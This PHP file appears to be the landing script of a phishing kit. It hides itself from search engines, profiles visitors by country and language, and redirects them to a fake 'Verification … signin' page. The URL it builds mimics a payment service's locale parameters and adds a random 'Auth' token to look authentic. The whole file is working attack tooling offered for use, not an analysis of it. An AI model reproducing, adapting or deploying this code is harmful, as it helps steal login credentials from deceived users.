<?php
@session_start();  
error_reporting(0); 
header("X-Robots-Tag: noindex, nofollow", true);
include("geoplugin.php");
include("os.php"); 
$language = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
switch ($language){
    case "fr": $lang = "fr";
		break;	
    case "it":
        $lang= "it";
        break;
    case "en":
        $lang= "en";
        break;  
	case "de":
        $lang= "de";
        break;
	case "br":
        $lang= "br";
        break;  
	case "es":
	    $lang = "es";
		break;
	case "nl":$lang = "nl";
		break;
		case "se": $lang = "se";
		break;
	case "ch": $lang = "ch";
		break;
	case "il": $lang = "il";
		break;
	case "jp": $lang = "jp";
		break;
	case "tr": $lang = "tr";
		break;
			case "no": $lang = "no";
		break;	
		case "da": $lang = "da";
		break;	
    default:
        $lang= "en";
        break;
}
$_SESSION['_lang_'] = $lang;
function URLSTRING($length= 20) {
    $code = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $stringo= '';
    for ($i = 0; $i < $length; $i++) {
        $stringo.= $code[rand(0, strlen($code) - 1)];
    }
    RETURN $stringo;
}
$dwsl = URLSTRING('40');
header("location:./Verification/users/userID-44473/signin/?country.x=".$countrycode."&locale.x=".$_SESSION['_lang_']."_".$countrycode."&Auth= ".$dwsl."");
?>